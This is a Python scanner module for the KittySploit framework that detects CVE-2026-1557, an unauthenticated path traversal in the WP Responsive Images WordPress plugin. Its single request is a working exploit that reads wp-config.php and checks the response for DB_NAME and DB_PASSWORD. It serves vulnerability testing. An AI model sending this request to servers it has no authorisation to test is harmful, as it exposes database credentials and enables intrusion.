#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WP Responsive Images plugin for WordPress <= 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WP Responsive Images <= 1.0 - Arbitrary File Read Detection',
        'description': "WP Responsive Images plugin for WordPress <= 1.0 contains a path traversal caused by improper sanitization of the 'src' parameter, letting unauthenticated attackers read arbitrary files on the server.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'wordpress', 'wp', 'wp-plugin', 'lfi', 'wp-responsive-images', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-responsive-images/wp-responsive-images-10-unauthenticated-path-traversal-to-arbitrary-file-read-via-src',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-1557',
        ],
        'cve': 'CVE-2026-1557',
    }

    def run(self):
        path = '/wp-content/plugins/wp-responsive-images/image_handler.php?src=/wp-config.php'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='WP Responsive Images <= 1.0 - Arbitrary File Read detected', path=path)
            return True
        return False

